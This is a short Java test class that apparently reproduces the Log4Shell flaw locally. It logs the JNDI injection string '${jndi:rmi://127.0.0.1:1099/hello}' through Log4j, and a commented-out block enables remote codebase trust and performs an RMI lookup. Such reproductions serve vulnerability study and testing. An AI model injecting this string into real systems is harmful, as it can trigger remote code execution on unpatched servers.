package com.transfar.test;

//import javax.naming.Context;
//import javax.naming.InitialContext;
//import java.util.Hashtable;
//
//public class RmiClient {
//
//    public static void main(String[] args) throws Exception {
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
//        Hashtable env = new Hashtable();
//        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
//        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
//        Context ctx = new InitialContext(env);
//        ctx.lookup("hello");
//    }
//}

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class RmiClient {

    private static final Logger logger = LogManager.getLogger(RmiClient.class);

    public static void main(String[] args) throws Exception {
        //logger.error("${jndi:rmi://127.0.0.1:1099/hello}" + 111);
        String variable = "${jndi:rmi://127.0.0.1:1099/hello}";
        logger.error(variable);

        Thread.sleep(5000);
    }
}


